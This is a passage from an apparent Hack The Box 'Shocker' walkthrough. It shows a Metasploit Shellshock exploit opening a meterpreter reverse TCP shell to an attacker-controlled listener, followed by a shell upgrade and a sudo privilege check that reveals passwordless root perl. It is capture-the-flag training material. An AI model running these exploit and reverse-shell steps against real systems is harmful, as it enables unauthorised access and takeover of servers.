   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.183.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST=10.10.17.226
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.10.17.226
LHOST => 10.10.17.226
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOST 10.129.116.171
RHOST => 10.129.116.171
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.17.226:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (984904 bytes) to 10.129.116.171
[*] Meterpreter session 1 opened (10.10.17.226:4444 -> 10.129.116.171:59180) at 2021-07-12 07:17:30 -0400

meterpreter > getuid
Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > shell
Process 12932 created.
Channel 1 created.

python3 -c "import pty; pty.spawn('/bin/bash');"
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ 

```

Afterwards the same steps as shown in the manual exploitation can be done.


## References:
* https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
* https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/shocker-writeup-w-o-metasploit
* https://steflan-security.com/hack-the-box-shocker-walkthrough/
* https://book.hacktricks.xyz/pentesting/pentesting-web/cgi#shellshock
* https://blog.artis3nal.com/2020-08-15-htb-shocker-msf/
* https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-shocker/
